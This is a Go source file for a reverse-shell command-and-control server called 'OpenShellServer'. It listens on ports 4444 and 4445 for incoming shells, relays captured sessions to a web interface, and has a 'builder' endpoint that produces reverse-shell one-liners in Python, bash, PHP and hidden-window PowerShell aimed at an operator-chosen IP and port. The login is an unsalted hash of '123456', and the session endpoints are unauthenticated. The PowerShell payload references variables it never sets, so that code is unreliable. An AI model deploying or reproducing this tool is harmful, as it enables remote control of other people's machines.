package main

import (
    "crypto/sha256"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io"
    "log"
    "net/http"

    "github.com/gorilla/websocket"
)

var manager = NewSessionManager()
var upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
var passwordHash = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92" //123456

type LoginReq struct{ Password string `json:"password"` }

func loginHandler(w http.ResponseWriter,r *http.Request){
    if r.Method!="POST"{http.Error(w,"Method not allowed",405); return}
    body,_ := io.ReadAll(r.Body)
    var req LoginReq
    json.Unmarshal(body,&req)
    sum:=sha256.Sum256([]byte(req.Password))
    if hex.EncodeToString(sum[:])==passwordHash{
        w.WriteHeader(200)
        return
    }
    http.Error(w,"Wrong password",401)
}

func builderHandler(w http.ResponseWriter,r *http.Request){
    lang := r.URL.Query().Get("lang")
    ip := r.URL.Query().Get("ip")
    port := r.URL.Query().Get("port")
    payload := ""
    switch lang{
    case "python": payload = fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket().connect(("%s",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,ip,port)
    case "bash": payload = fmt.Sprintf(`bash -i >& /dev/tcp/%s/%s 0>&1`,ip,port)
    case "php": payload = fmt.Sprintf(`php -r '$s=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`,ip,port)
    case "powershell": payload = fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(iex $d 2>&1 | Out-String);$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"`,ip,port)
    }
    w.Write([]byte(payload))
}

func statsHandler(w http.ResponseWriter,r *http.Request){
    json.NewEncoder(w).Encode(map[string]int{"online": manager.Count()})
}

func sessionsHandler(w http.ResponseWriter,r *http.Request){
    json.NewEncoder(w).Encode(manager.ListSessions())
}

func attachHandler(w http.ResponseWriter,r *http.Request){
    id := r.URL.Query().Get("id")
    conn, err := upgrader.Upgrade(w,r,nil)
    if err!=nil{return}
    s := manager.sessions[id]
    if s==nil{return}
    s.Conn = conn
    if s.Net!=nil{ go s.bridgeReverse() }
    if s.Pty!=nil{ go s.bridgePTY() }
}

func main(){
    go StartReverseShellListener("4444")
    go StartTLSReverseShell("4445")

    http.HandleFunc("/api/login",loginHandler)
    http.HandleFunc("/api/builder",builderHandler)
    http.HandleFunc("/api/stats",statsHandler)
    http.HandleFunc("/api/sessions",sessionsHandler)
    http.HandleFunc("/ws/session",attachHandler)

    fs := http.FileServer(http.Dir("../web"))
    http.Handle("/",fs)

    log.Println("OpenShellServer running at :8080")
    log.Fatal(http.ListenAndServe(":8080",nil))
}